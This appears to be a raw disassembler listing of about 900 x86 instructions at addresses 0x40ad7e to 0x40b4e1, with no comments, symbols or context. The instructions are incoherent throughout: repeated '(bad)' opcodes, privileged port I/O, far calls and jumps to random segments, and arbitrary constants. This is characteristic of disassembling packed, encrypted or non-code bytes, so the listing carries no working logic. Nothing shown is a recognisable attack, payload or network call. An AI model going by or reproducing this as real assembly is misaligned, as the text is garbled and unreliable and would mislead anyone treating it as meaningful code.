  40ad7e:	and    DWORD PTR [esi+0x522c68fc],esi
  40ad84:	cwde   
  40ad85:	out    0xff,al
  40ad87:	ins    BYTE PTR es:[edi],dx
  40ad88:	sub    BYTE PTR [edx],bh
  40ad8a:	and    DWORD PTR [ebp+0x45],esi
  40ad8d:	push   edx
  40ad8e:	dec    edx
  40ad8f:	mov    ds:0xcc5c7bf6,eax
  40ad94:	pusha  
  40ad95:	fadd   QWORD PTR [ebx]
  40ad97:	mov    ebp,0xcee460c2
  40ad9c:	sbb    BYTE PTR [esi],0xf6
  40ad9f:	or     esi,DWORD PTR [ecx+0x56]
  40ada2:	jmp    0x738abf9
  40ada7:	mov    bl,0xd
  40ada9:	retf   
  40adaa:	idiv   edi
  40adac:	outs   dx,BYTE PTR ds:[esi]
  40adad:	add    esp,eax
  40adaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adb0:	add    cl,BYTE PTR [eax+0x7e]
  40adb3:	imul   esi,DWORD PTR [edi+0x61],0xffffff90
  40adb7:	data16 mov bl,0x10
  40adba:	daa    
  40adbb:	data16 jl 0x40adbc
  40adbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adbf:	xchg   DWORD PTR [edx],edx
  40adc1:	stos   DWORD PTR es:[edi],eax
  40adc2:	addr16 das 
  40adc4:	mov    fs,WORD PTR [eax+0x65b182de]
  40adca:	test   eax,0x9aaa767e
  40adcf:	or     ebx,esi
  40add1:	stc    
  40add2:	jo     0x40addc
  40add4:	jb     0x40adf4
  40add6:	sub    eax,0x43a9c3ef
  40addb:	(bad)  
  40addc:	or     bl,BYTE PTR [eax+0x1e]
  40addf:	jbe    0x40adc0
  40ade1:	sub    al,0x81
  40ade3:	imul   esp,DWORD PTR [edx],0x86ccfa47
  40ade9:	shl    DWORD PTR [eax-0x44621c48],0x99
  40adf0:	pop    ss
  40adf1:	jae    0x40ae3c
  40adf3:	mov    eax,ds:0xaf058664
  40adf8:	retf   
  40adf9:	mov    ebx,0x66a01b8c
  40adfe:	jge    0x40ae66
  40ae00:	fst    QWORD PTR [edx+eiz*4]
  40ae03:	dec    ecx
  40ae04:	cli    
  40ae05:	repz inc edi
  40ae07:	inc    esi
  40ae08:	lods   eax,DWORD PTR ds:[esi]
  40ae09:	push   esp
  40ae0a:	add    eax,0x42a113f6
  40ae0f:	in     al,0xcd
  40ae11:	jg     0x40adc7
  40ae13:	(bad)  
  40ae14:	int    0xa0
  40ae16:	xchg   ebp,eax
  40ae17:	xchg   esp,eax
  40ae18:	psubsb mm4,mm7
  40ae1b:	add    al,0x53
  40ae1d:	add    bl,dh
  40ae1f:	addr16 cdq 
  40ae21:	mov    ebp,0x7fc2784f
  40ae26:	daa    
  40ae27:	xchg   ebp,eax
  40ae28:	push   0xffffff88
  40ae2a:	push   0x2d
  40ae2c:	pop    esi
  40ae2d:	push   edx
  40ae2e:	lods   al,BYTE PTR ds:[esi]
  40ae2f:	jno    0x40ae19
  40ae31:	sbb    eax,0xdfdce442
  40ae36:	push   cs
  40ae37:	add    DWORD PTR [ebx+0x2391668],esp
  40ae3d:	scas   al,BYTE PTR es:[edi]
  40ae3e:	mov    ecx,0xef12eb28
  40ae43:	push   eax
  40ae44:	hlt    
  40ae45:	popf   
  40ae46:	fimul  DWORD PTR [esi-0x307cfb2]
  40ae4c:	xor    al,0x82
  40ae4e:	fnsave [edi]
  40ae50:	in     eax,0x5c
  40ae52:	in     al,dx
  40ae53:	int    0xee
  40ae55:	sahf   
  40ae56:	jmp    0xb7a9bf56
  40ae5b:	xchg   edx,eax
  40ae5c:	and    eax,0x3ce27457
  40ae61:	test   DWORD PTR [esi+0x3f7e0cf3],esp
  40ae67:	fucomi st,st(2)
  40ae69:	and    eax,edx
  40ae6b:	dec    esp
  40ae6c:	ins    BYTE PTR es:[edi],dx
  40ae6d:	mov    cl,0x6f
  40ae6f:	jno    0x40ae9a
  40ae71:	xchg   ecx,eax
  40ae72:	add    bh,dl
  40ae74:	out    dx,eax
  40ae75:	jnp    0x40aea4
  40ae77:	test   al,0xbf
  40ae79:	push   ds
  40ae7a:	and    ah,dl
  40ae7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae7d:	xor    eax,0x74d9cea7
  40ae82:	cmp    eax,0x68f1772b
  40ae87:	and    cl,BYTE PTR [edx+0x3568614c]
  40ae8d:	jge    0x40aeb3
  40ae8f:	adc    bh,BYTE PTR [edi-0x42]
  40ae92:	jno    0x40ae23
  40ae94:	aam    0x33
  40ae96:	in     eax,dx
  40ae97:	xchg   ebp,eax
  40ae98:	fiadd  DWORD PTR [edx+0x25733597]
  40ae9e:	imul   esi,DWORD PTR [ecx-0x25122f48],0x24
  40aea5:	dec    eax
  40aea6:	or     al,0x18
  40aea8:	inc    edi
  40aea9:	or     BYTE PTR [edi-0x4a],ch
  40aeac:	cmp    eax,0x55297398
  40aeb1:	mov    BYTE PTR [esi+0x270310ef],ah
  40aeb7:	xchg   BYTE PTR [ecx+eax*8+0x58],bh
  40aebb:	arpl   di,ax
  40aebd:	std    
  40aebe:	mov    ah,0xab
  40aec0:	ins    BYTE PTR es:[edi],dx
  40aec1:	sub    ebp,edi
  40aec3:	pop    ss
  40aec4:	jne    0x40ae59
  40aec6:	or     BYTE PTR [ecx-0x8ab5156],ch
  40aecc:	out    dx,eax
  40aecd:	and    BYTE PTR [edi+0x10],cl
  40aed0:	pop    eax
  40aed1:	inc    ecx
  40aed2:	int3   
  40aed3:	or     BYTE PTR [esi+0x46],0x33
  40aed7:	lods   eax,DWORD PTR ds:[esi]
  40aed8:	push   edi
  40aed9:	mov    ah,0xb4
  40aedb:	out    dx,eax
  40aedc:	push   esp
  40aedd:	push   ebp
  40aede:	das    
  40aedf:	hlt    
  40aee0:	add    DWORD PTR [edx],esp
  40aee2:	push   es
  40aee3:	in     eax,dx
  40aee4:	js     0x40aea8
  40aee6:	fisttp DWORD PTR [edx+0x4b]
  40aee9:	out    dx,eax
  40aeea:	sbb    DWORD PTR [esi],edi
  40aeec:	stos   DWORD PTR es:[edi],eax
  40aeed:	dec    edx
  40aeee:	cmp    al,0xbd
  40aef0:	popa   
  40aef1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aef2:	das    
  40aef3:	jl     0x40af46
  40aef5:	mov    dh,0x16
  40aef7:	dec    edx
  40aef8:	push   0xb4736f35
  40aefd:	ret    
  40aefe:	cli    
  40aeff:	sub    esp,DWORD PTR [ecx+0x2a]
  40af02:	adc    dh,BYTE PTR [eax+edi*2]
  40af05:	inc    eax
  40af06:	jbe    0x40aecc
  40af08:	xchg   edi,eax
  40af09:	inc    edx
  40af0a:	push   es
  40af0b:	xlat   BYTE PTR ds:[ebx]
  40af0c:	xchg   ebx,eax
  40af0d:	jg     0x40aece
  40af0f:	mov    ds:0x2fa96b5a,al
  40af14:	or     al,bh
  40af16:	sub    cl,bh
  40af18:	(bad)  
  40af19:	(bad)  
  40af1a:	int    0x38
  40af1c:	popa   
  40af1d:	mov    ds:0x57459eed,eax
  40af22:	xlat   BYTE PTR ds:[ebx]
  40af23:	std    
  40af24:	stos   BYTE PTR es:[edi],al
  40af25:	stc    
  40af26:	cmp    BYTE PTR [esi+0x6683728f],0x7f
  40af2d:	pop    ecx
  40af2e:	imul   esp,DWORD PTR cs:[ebx],0xfffffff0
  40af32:	test   al,0x65
  40af34:	shl    edi,cl
  40af36:	dec    esi
  40af37:	lods   eax,DWORD PTR ds:[esi]
  40af38:	push   0x55
  40af3a:	xchg   ebx,eax
  40af3b:	call   0xa4e1:0x41a60f8f
  40af42:	inc    esi
  40af43:	outs   dx,BYTE PTR ds:[esi]
  40af44:	test   al,0x91
  40af46:	sub    eax,0x75f0515c
  40af4b:	mov    ebp,0x3b6ad4db
  40af50:	xor    eax,0x172d588d
  40af55:	sub    al,BYTE PTR [esi-0x3af6ef8d]
  40af5b:	cmp    DWORD PTR [eax],0xffffffcd
  40af5e:	int3   
  40af5f:	and    ah,BYTE PTR [ebx+0x3116f120]
  40af65:	in     al,dx
  40af66:	cli    
  40af67:	test   BYTE PTR [esi+ebx*1-0x2e4c9f63],al
  40af6e:	ss push 0xadd19f42
  40af74:	cmp    al,0x17
  40af76:	pop    ebp
  40af77:	xchg   esp,eax
  40af78:	lahf   
  40af79:	pop    es
  40af7a:	adc    esi,DWORD PTR [ebp+0x2ad13d7b]
  40af80:	inc    ebp
  40af81:	mov    cl,BYTE PTR [edx-0x68]
  40af84:	aam    0x47
  40af86:	push   edi
  40af87:	xor    bh,BYTE PTR [ebx+0x4dc6878d]
  40af8d:	ins    BYTE PTR es:[edi],dx
  40af8e:	test   al,0xce
  40af90:	inc    edx
  40af91:	mov    ebx,0xb0fd2889
  40af96:	jo     0x40b014
  40af98:	std    
  40af99:	xchg   ebp,edx
  40af9b:	inc    edx
  40af9c:	inc    ebx
  40af9d:	(bad)  ds:0xb1da7a62
  40afa3:	mov    ebp,0xde4dcf9d
  40afa8:	add    eax,0x1b7831ad
  40afad:	push   esi
  40afae:	adc    edi,DWORD PTR [eax-0x408c63a8]
  40afb4:	in     al,0xc7
  40afb6:	pusha  
  40afb7:	sub    DWORD PTR [ebx+ebp*8+0x6e],esp
  40afbb:	sub    ch,BYTE PTR [edx]
  40afbd:	jp     0x40affd
  40afbf:	dec    edi
  40afc0:	cwde   
  40afc1:	stos   DWORD PTR es:[edi],eax
  40afc2:	ret    0x3b1b
  40afc5:	push   es
  40afc6:	jl     0x40af59
  40afc8:	in     al,0x4d
  40afca:	inc    esp
  40afcb:	ds mov edx,0x6675c0de
  40afd1:	mov    esp,ds
  40afd3:	add    DWORD PTR [edi],ebx
  40afd5:	std    
  40afd6:	mov    ebp,0x3fa88c07
  40afdb:	jge    0x40b003
  40afdd:	xlat   BYTE PTR ds:[ebx]
  40afde:	mov    al,ds:0x45a4a14d
  40afe3:	inc    edx
  40afe4:	clc    
  40afe5:	add    DWORD PTR [eax-0x20],ebp
  40afe8:	leave  
  40afe9:	mov    eax,ds:0x88a08c64
  40afee:	div    DWORD PTR [eax+0x6e]
  40aff1:	je     0x40b047
  40aff3:	inc    ecx
  40aff4:	jge    0x40afd7
  40aff6:	xor    eax,0x48a4579b
  40affb:	mov    edi,0x1f839162
  40b000:	inc    ebp
  40b001:	mov    al,0x9a
  40b003:	cmp    BYTE PTR [bp+si],cl
  40b006:	ds call 0xbed1:0xc13a00ca
  40b00e:	push   es
  40b00f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b010:	inc    esi
  40b011:	retf   0x311c
  40b014:	push   es
  40b015:	call   0x9b36:0xdf415547
  40b01c:	or     DWORD PTR [esi],esi
  40b01e:	dec    edx
  40b01f:	cdq    
  40b020:	ins    DWORD PTR es:[edi],dx
  40b021:	iret   
  40b022:	test   dh,dl
  40b024:	sbb    DWORD PTR [ecx+0x45],ebp
  40b027:	mov    ebp,0x897875dc
  40b02c:	push   0x29ed18a
  40b031:	xor    bh,BYTE PTR [edi+0x3f]
  40b034:	mov    al,ds:0xa948b00f
  40b039:	sub    esp,DWORD PTR [ebx-0x2c94b20]
  40b03f:	push   ss
  40b040:	push   esp
  40b041:	comiss xmm1,xmm2
  40b044:	sbb    eax,0xeef2c581
  40b049:	ins    BYTE PTR es:[edi],dx
  40b04a:	add    DWORD PTR ss:[ecx-0x1d490c97],esp
  40b051:	test   al,0xaf
  40b053:	fdiv   QWORD PTR [ecx]
  40b055:	pop    ds
  40b056:	jp     0x40b00d
  40b058:	mov    ah,0xfa
  40b05a:	cmp    al,0x2d
  40b05c:	icebp  
  40b05d:	es and dh,dh
  40b060:	push   ss
  40b061:	cld    
  40b062:	push   edi
  40b063:	shl    bl,cl
  40b065:	out    0xda,eax
  40b067:	xchg   esp,eax
  40b068:	sbb    al,0x3e
  40b06a:	sub    DWORD PTR [esp+ecx*8],edx
  40b06d:	stos   DWORD PTR es:[edi],eax
  40b06e:	mov    bl,0x13
  40b070:	cmp    ecx,ebp
  40b072:	pop    ss
  40b073:	mov    WORD PTR [edx],gs
  40b075:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b076:	dec    ecx
  40b077:	jnp    0x40b0e4
  40b079:	mov    ecx,0xff9ae760
  40b07e:	sbb    eax,0xacbf9f21
  40b083:	mov    ?,WORD PTR [ebx-0x40]
  40b086:	sbb    al,BYTE PTR [eax-0x32]
  40b089:	test   al,dh
  40b08b:	fwait
  40b08c:	sub    ebp,ebp
  40b08e:	jmp    0x40b103
  40b090:	mov    al,0xfa
  40b092:	fild   QWORD PTR [ecx+eax*2+0x2a]
  40b096:	cmp    edx,DWORD PTR [ebp+0x336e1626]
  40b09c:	dec    ecx
  40b09d:	xchg   DWORD PTR [ebp+0x36],esp
  40b0a0:	mov    cl,0xac
  40b0a2:	push   cs
  40b0a3:	aam    0xdb
  40b0a5:	mov    ebp,0xe08f75d8
  40b0aa:	mov    bl,0xa0
  40b0ac:	cld    
  40b0ad:	xchg   esi,eax
  40b0ae:	sbb    ebp,ebp
  40b0b0:	mov    ecx,0xe09dd6df
  40b0b5:	sbb    BYTE PTR [ebp-0xd],al
  40b0b8:	adc    DWORD PTR [ebx+0x46],eax
  40b0bb:	call   0x54c2e9ab
  40b0c0:	out    0x4d,al
  40b0c2:	(bad)  
  40b0c4:	adc    al,0x78
  40b0c6:	ss aas 
  40b0c8:	sub    ebx,DWORD PTR [ebp+0x2c]
  40b0cb:	out    0x1a,al
  40b0cd:	jbe    0x40b0e9
  40b0cf:	and    eax,0xaf58bf51
  40b0d4:	cmp    edi,DWORD PTR [eax+0xc]
  40b0d7:	or     al,0x22
  40b0d9:	frstor [eax+0x54]
  40b0dc:	daa    
  40b0dd:	div    cl
  40b0df:	add    edi,edx
  40b0e1:	inc    ebx
  40b0e2:	pop    edi
  40b0e3:	sub    esp,DWORD PTR [ecx+0x77]
  40b0e6:	std    
  40b0e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0e8:	(bad)  
  40b0e9:	fnsave [eax]
  40b0eb:	mov    ecx,0xd6071193
  40b0f0:	shr    DWORD PTR [ecx-0x46],cl
  40b0f3:	scas   eax,DWORD PTR es:[edi]
  40b0f4:	(bad)  
  40b0f6:	push   eax
  40b0f7:	popf   
  40b0f8:	or     BYTE PTR [edi],al
  40b0fa:	mov    edi,DWORD PTR [ebp-0x9106276]
  40b100:	pop    esp
  40b101:	pop    edi
  40b102:	dec    esi
  40b103:	and    DWORD PTR [ebp-0x747d8fbf],ecx
  40b109:	(bad)  
  40b10a:	pop    edi
  40b10b:	push   ss
  40b10c:	lsl    edi,si
  40b10f:	sbb    al,0xcf
  40b111:	fbld   TBYTE PTR [esi+0x35]
  40b114:	jmp    0xabe3:0x61a7810b
  40b11b:	retf   
  40b11c:	and    DWORD PTR [edx],ecx
  40b11e:	neg    DWORD PTR [edi+0x62]
  40b121:	lahf   
  40b122:	dec    edi
  40b123:	out    0xd4,eax
  40b125:	scas   eax,DWORD PTR es:[edi]
  40b126:	mov    fs,ecx
  40b128:	xor    BYTE PTR [eax+0x73f50a6f],cl
  40b12e:	and    al,0xe4
  40b130:	aam    0x13
  40b132:	rcl    esp,cl
  40b134:	add    ah,ch
  40b136:	sbb    ecx,edx
  40b138:	cmp    esp,DWORD PTR [ecx-0x27081a58]
  40b13e:	(bad)  
  40b13f:	dec    ecx
  40b140:	gs inc ebx
  40b142:	adc    BYTE PTR [esi-0x2f],ch
  40b145:	(bad)  
  40b146:	jg     0x40b1a5
  40b148:	jnp    0x40b0d2
  40b14a:	shl    BYTE PTR [ecx+edx*8],0x38
  40b14e:	xchg   esi,ebx
  40b150:	fdiv   st(7),st
  40b152:	pop    esp
  40b153:	xor    BYTE PTR [ecx-0x7d082d57],ah
  40b159:	dec    edx
  40b15a:	loopne 0x40b1a9
  40b15c:	inc    ebp
  40b15d:	mov    edi,0x6cd4c3cd
  40b162:	int3   
  40b163:	xor    eax,0xf41d8063
  40b168:	pop    edi
  40b169:	(bad)  
  40b16b:	mov    al,0x76
  40b16d:	frstor [esi-0x6a]
  40b170:	sti    
  40b171:	and    BYTE PTR [ecx+0x2140cbba],al
  40b177:	mov    ah,0x3c
  40b179:	sbb    bl,BYTE PTR [ebx+0x5e197bf3]
  40b17f:	pop    ebx
  40b180:	fisubr WORD PTR [ecx+0x64]
  40b183:	jmp    0xf95f:0x5ddc1c7d
  40b18a:	xor    edi,DWORD PTR [edi-0x51]
  40b18d:	retf   
  40b18e:	jecxz  0x40b18c
  40b190:	jns    0x40b14d
  40b192:	popf   
  40b193:	mov    esp,0x1649d031
  40b198:	dec    esp
  40b199:	imul   ebx,DWORD PTR ds:[edx+0x68],0x7b07745d
  40b1a1:	dec    edx
  40b1a2:	fidiv  WORD PTR [ecx-0x2b]
  40b1a5:	mov    al,ds:0xe9a15e2b
  40b1aa:	jmp    0x40b1df
  40b1ac:	pop    ss
  40b1ad:	or     al,0x83
  40b1af:	push   ecx
  40b1b0:	sar    DWORD PTR [esp+ecx*1+0x3617cf95],1
  40b1b7:	add    cl,BYTE PTR [ecx-0x2683d4e0]
  40b1bd:	push   eax
  40b1be:	cmp    cl,ch
  40b1c0:	sub    bl,dl
  40b1c2:	cmp    ch,BYTE PTR [ebp-0x6e18f94f]
  40b1c8:	inc    eax
  40b1c9:	push   esi
  40b1ca:	jns    0x40b219
  40b1cc:	je     0x40b241
  40b1ce:	test   DWORD PTR [ebp+0xf810702],ebp
  40b1d4:	sub    DWORD PTR [edx+0x2418568c],eax
  40b1da:	dec    ebx
  40b1db:	mov    eax,ds:0xff47b244
  40b1e0:	dec    esp
  40b1e1:	in     eax,dx
  40b1e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1e3:	out    dx,eax
  40b1e4:	stc    
  40b1e5:	jge    0x40b1eb
  40b1e7:	push   edx
  40b1e8:	fisubr WORD PTR [esi+0x63e600aa]
  40b1ee:	dec    edx
  40b1ef:	and    DWORD PTR [ecx+0x24],edi
  40b1f2:	lods   eax,DWORD PTR ds:[esi]
  40b1f3:	cmp    DWORD PTR [ecx],0xad93a7bf
  40b1f9:	lahf   
  40b1fa:	pop    ds
  40b1fb:	jns    0x40b271
  40b1fd:	cli    
  40b1fe:	lods   al,BYTE PTR ds:[esi]
  40b1ff:	adc    bh,BYTE PTR [ecx]
  40b201:	int    0xa1
  40b203:	es fwait
  40b205:	outs   dx,DWORD PTR ds:[esi]
  40b206:	jmp    0x8793:0x73d1915e
  40b20d:	loopne 0x40b1bf
  40b20f:	imul   edx,DWORD PTR [eax+0x5b200a77],0x887195c8
  40b219:	jl     0x40b26f
  40b21b:	shl    cl,0xa4
  40b21e:	lods   al,BYTE PTR ds:[esi]
  40b21f:	fs or  eax,0xfcecb496
  40b225:	das    
  40b226:	inc    eax
  40b227:	in     eax,0x27
  40b229:	or     al,0xcb
  40b22b:	xchg   esi,eax
  40b22c:	xor    DWORD PTR [eax+0x6804f961],0x2724475b
  40b236:	dec    esi
  40b237:	outs   dx,DWORD PTR ds:[esi]
  40b238:	jo     0x40b26b
  40b23a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b23b:	push   ds
  40b23c:	(bad)  
  40b23e:	xchg   ebx,eax
  40b23f:	ds sti 
  40b241:	add    BYTE PTR [ecx+0x9d016fb],0xc
  40b248:	xchg   edx,eax
  40b249:	or     esi,DWORD PTR [eax+0x19]
  40b24c:	push   ecx
  40b24d:	iret   
  40b24e:	mov    ds:0x36712079,eax
  40b253:	pop    ebx
  40b254:	(bad)  
  40b255:	lea    ecx,[esi]
  40b257:	add    dl,BYTE PTR [edx-0x59]
  40b25a:	inc    ecx
  40b25b:	sbb    bh,BYTE PTR [edi-0x64]
  40b25e:	sub    eax,0x5abe9239
  40b263:	out    0x85,al
  40b265:	xchg   ebx,eax
  40b266:	sti    
  40b267:	ror    BYTE PTR [edx],0xb9
  40b26a:	rcr    DWORD PTR [ebp+0x5],cl
  40b26d:	or     bl,BYTE PTR [ebx+0x2ee92f7c]
  40b273:	jecxz  0x40b298
  40b275:	push   edx
  40b276:	lea    edi,[ecx+0x3b87d0c6]
  40b27c:	call   0x6234dba2
  40b281:	xor    BYTE PTR [esi-0x52],ch
  40b284:	mov    al,ds:0xa5cceb2b
  40b289:	lock out 0x1b,al
  40b28c:	push   ebx
  40b28d:	fwait
  40b28e:	mov    bh,0xb4
  40b290:	or     esp,DWORD PTR [esi]
  40b292:	mov    ch,0xda
  40b294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b295:	adc    edx,esp
  40b297:	inc    edi
  40b298:	ins    BYTE PTR es:[edi],dx
  40b299:	stc    
  40b29a:	mov    ds:0x91d5120b,eax
  40b29f:	hlt    
  40b2a0:	fcmovbe st,st(1)
  40b2a2:	add    al,0xe5
  40b2a4:	and    bl,dl
  40b2a6:	sub    BYTE PTR [ebx+esi*2-0x10cd9290],ch
  40b2ad:	jle    0x40b2c4
  40b2af:	add    eax,0xb7f64d2b
  40b2b4:	xor    esp,DWORD PTR [edi-0x1cd72d5e]
  40b2ba:	pop    eax
  40b2bb:	repnz push ds
  40b2bd:	addr16 loop 0x40b247
  40b2c0:	jp     0x40b244
  40b2c2:	or     al,0xcc
  40b2c4:	(bad)  
  40b2c5:	cmp    bl,BYTE PTR [eax-0x21bd21c9]
  40b2cb:	pop    eax
  40b2cc:	inc    esp
  40b2cd:	retf   
  40b2ce:	push   edi
  40b2cf:	daa    
  40b2d0:	fimul  DWORD PTR [ebx-0x3a]
  40b2d3:	sub    BYTE PTR [esi+edi*4-0x218d8b5b],cl
  40b2da:	mov    bl,0x8f
  40b2dc:	pop    ebp
  40b2dd:	js     0x40b2cf
  40b2df:	cmp    al,0x41
  40b2e1:	or     DWORD PTR [ebp+0x673b753a],ebx
  40b2e7:	pop    eax
  40b2e8:	jp     0x40b2c0
  40b2ea:	or     al,0x21
  40b2ec:	and    edx,DWORD PTR [ebx]
  40b2ee:	mov    DWORD PTR [ecx+0x1b],0x66bc8a07
  40b2f5:	mov    esi,0x5c3cf04f
  40b2fa:	add    ebx,0xfffffff4
  40b2fd:	jge    0x40b291
  40b2ff:	sbb    al,0xf8
  40b301:	sbb    DWORD PTR [esi-0xaf6a314],edx
  40b307:	dec    ecx
  40b308:	adc    BYTE PTR [ecx+0x6d1ca989],cl
  40b30e:	sub    al,0x29
  40b310:	sbb    edi,DWORD PTR [ecx-0x71]
  40b313:	sbb    eax,0x6bc3e95e
  40b318:	mov    dl,0x92
  40b31a:	enter  0x46c3,0xed
  40b31e:	ja     0x40b37a
  40b320:	jp     0x40b324
  40b322:	xor    eax,0xa97293b3
  40b327:	scas   eax,DWORD PTR es:[edi]
  40b328:	push   eax
  40b329:	(bad)  
  40b32a:	jns    0x40b2eb
  40b32c:	jl     0x40b387
  40b32e:	adc    eax,eax
  40b330:	xchg   ebx,eax
  40b331:	(bad)  
  40b332:	adc    eax,0xd0bd17c8
  40b337:	sub    al,0xeb
  40b339:	mov    bh,0x4a
  40b33b:	test   BYTE PTR [edx],dl
  40b33d:	repnz xchg edx,eax
  40b33f:	mov    edi,0xdd74eda9
  40b344:	cmp    al,ah
  40b346:	inc    eax
  40b347:	cmp    al,0xa0
  40b349:	mov    ah,0xe4
  40b34b:	add    DWORD PTR [ebp-0x25],ecx
  40b34e:	add    DWORD PTR [ebp+0x7fa48e8e],edx
  40b354:	imul   ecx,DWORD PTR [esi-0x5a5bc6c3]
  40b35b:	lods   eax,DWORD PTR ds:[esi]
  40b35c:	ins    DWORD PTR es:[edi],dx
  40b35d:	and    esp,DWORD PTR [ecx+0x4407920e]
  40b363:	push   esp
  40b364:	fwait
  40b365:	and    bl,BYTE PTR [eiz*2-0x40ae450]
  40b36c:	aaa    
  40b36d:	aas    
  40b36e:	pusha  
  40b36f:	add    BYTE PTR [edx+ecx*4],0xe8
  40b373:	jp     0x40b360
  40b375:	add    BYTE PTR [ebx+eax*8+0x39],cl
  40b379:	es mov bh,0xb7
  40b37c:	inc    eax
  40b37d:	jecxz  0x40b3f3
  40b37f:	xor    BYTE PTR [ecx+0x948f645],bh
  40b385:	int3   
  40b386:	push   esp
  40b387:	sub    esp,esp
  40b389:	bound  ebx,QWORD PTR [ecx+0x204c4ee2]
  40b38f:	push   0x9d21e05e
  40b394:	jbe    0x40b3e7
  40b396:	fs aad 0xb9
  40b399:	mov    esi,ss
  40b39b:	push   es
  40b39c:	mov    ds:0x5085eace,eax
  40b3a1:	adc    DWORD PTR [esi-0xc89f3d1],edx
  40b3a7:	call   DWORD PTR [edx]
  40b3a9:	add    BYTE PTR [edx+0x24f3544e],bl
  40b3af:	push   ebx
  40b3b0:	jb     0x40b3da
  40b3b2:	xor    eax,0x7a2e7c8f
  40b3b7:	mul    BYTE PTR [eax+0x1]
  40b3ba:	xchg   ebp,eax
  40b3bb:	sti    
  40b3bc:	xlat   BYTE PTR ds:[ebx]
  40b3bd:	fmulp  st(6),st
  40b3bf:	inc    eax
  40b3c0:	pop    ss
  40b3c1:	sbb    bl,BYTE PTR ds:0x488065d6
  40b3c7:	pop    esi
  40b3c8:	mov    esp,0xda1e086d
  40b3cd:	out    dx,al
  40b3ce:	out    0xd6,eax
  40b3d0:	sub    DWORD PTR [esi],0xffffffb8
  40b3d3:	add    al,bl
  40b3d5:	std    
  40b3d6:	or     eax,0x1f707510
  40b3db:	sbb    dh,BYTE PTR [ebp+esi*8+0x15b3d73e]
  40b3e2:	mov    bl,0x71
  40b3e4:	test   al,0x70
  40b3e6:	popa   
  40b3e7:	mov    esi,0xea8cd142
  40b3ec:	and    BYTE PTR [ebx],ch
  40b3ee:	not    BYTE PTR [eax-0x4a]
  40b3f1:	adc    ch,BYTE PTR [ecx+0x2102aebe]
  40b3f7:	shr    bh,0xac
  40b3fa:	push   ecx
  40b3fb:	xlat   BYTE PTR ds:[ebx]
  40b3fc:	mov    dl,0xbe
  40b3fe:	repz fild DWORD PTR [esp+ebp*4-0x4]
  40b403:	gs aad 0xae
  40b406:	xchg   edi,eax
  40b407:	(bad)  
  40b408:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b409:	xchg   DWORD PTR [ebx],esi
  40b40b:	xchg   esp,eax
  40b40c:	clc    
  40b40d:	xor    bh,BYTE PTR [eax-0x32]
  40b410:	int    0x9a
  40b412:	in     eax,dx
  40b413:	and    ebp,DWORD PTR [ebp+ebx*8+0x42]
  40b417:	xchg   ebp,eax
  40b418:	or     dl,BYTE PTR [eax-0x24]
  40b41b:	xlat   BYTE PTR ds:[ebx]
  40b41c:	lods   eax,DWORD PTR ds:[esi]
  40b41d:	and    al,0x42
  40b41f:	(bad)  
  40b420:	shr    BYTE PTR ds:0x6afc8ed4,0x90
  40b427:	dec    edi
  40b428:	sub    esp,0xffffff85
  40b42b:	or     DWORD PTR [edx],edi
  40b42d:	xlat   BYTE PTR ds:[ebx]
  40b42e:	cdq    
  40b42f:	bound  ebp,QWORD PTR [eax]
  40b431:	lods   al,BYTE PTR ds:[esi]
  40b432:	sahf   
  40b433:	push   esp
  40b434:	pop    ebx
  40b435:	lods   al,BYTE PTR ds:[esi]
  40b436:	mov    BYTE PTR ds:0x17da060b,dh
  40b43c:	xlat   BYTE PTR ds:[ebx]
  40b43d:	jp     0x40b40c
  40b43f:	inc    ecx
  40b440:	pop    es
  40b441:	push   esp
  40b442:	or     al,bl
  40b444:	test   DWORD PTR [esi+edi*4+0x43d08bf3],eax
  40b44b:	cdq    
  40b44c:	pop    ss
  40b44d:	mov    dh,0x33
  40b44f:	sbb    DWORD PTR ds:[edi-0x31bb11db],esp
  40b456:	pop    ebx
  40b457:	aaa    
  40b458:	mov    DWORD PTR [ebx],eax
  40b45a:	mov    ebp,0xc3e19b6a
  40b45f:	and    dl,BYTE PTR [edx+0x1]
  40b462:	mov    WORD PTR [ebx-0x1],?
  40b465:	pusha  
  40b466:	jge    0x40b46a
  40b468:	or     BYTE PTR [ebx],ah
  40b46a:	mov    ch,BYTE PTR [esi]
  40b46c:	and    al,0x3
  40b46e:	push   ds
  40b46f:	mov    ds,WORD PTR [ecx+0x60]
  40b472:	shl    DWORD PTR [edi],1
  40b474:	cld    
  40b475:	mov    bl,0x29
  40b477:	jae    0x40b4eb
  40b479:	jge    0x40b4ef
  40b47b:	jno    0x40b437
  40b47d:	mov    dl,0x67
  40b47f:	sub    BYTE PTR fs:[ebp+0xdc00f3],0x26
  40b487:	mov    bh,dl
  40b489:	ret    0x4256
  40b48c:	pop    edx
  40b48d:	jmp    0x6abbf76e
  40b492:	cwde   
  40b493:	push   eax
  40b494:	adc    edx,DWORD PTR [edi+0x62b68274]
  40b49a:	gs addr16 jmp 0x40b48d
  40b49e:	jb     0x40b510
  40b4a0:	stos   DWORD PTR es:[edi],eax
  40b4a1:	mov    WORD PTR [ebx],fs
  40b4a3:	adc    ebx,DWORD PTR [edi+0x5]
  40b4a6:	sub    BYTE PTR [esi-0x25ae0790],ch
  40b4ac:	jmp    0x9da6:0xbee2ca49
  40b4b3:	or     al,BYTE PTR [ebx]
  40b4b5:	imul   eax,DWORD PTR [edi-0x49],0xffffffe3
  40b4b9:	test   DWORD PTR [ebx+0xa05d388],0x2c072117
  40b4c3:	mov    BYTE PTR [eax],bl
  40b4c5:	or     bl,ch
  40b4c7:	(bad)  
  40b4c8:	call   0x4edd:0x55c4de7
  40b4cf:	xor    BYTE PTR [ebx],dl
  40b4d1:	mov    eax,0x460286e1
  40b4d6:	xor    al,0xa6
  40b4d8:	aad    0x6b
  40b4da:	lds    esi,FWORD PTR [ecx+0x42c968e2]
  40b4e0:	push   ecx
  40b4e1:	ficom  WORD PTR [edx+0x673820cf]
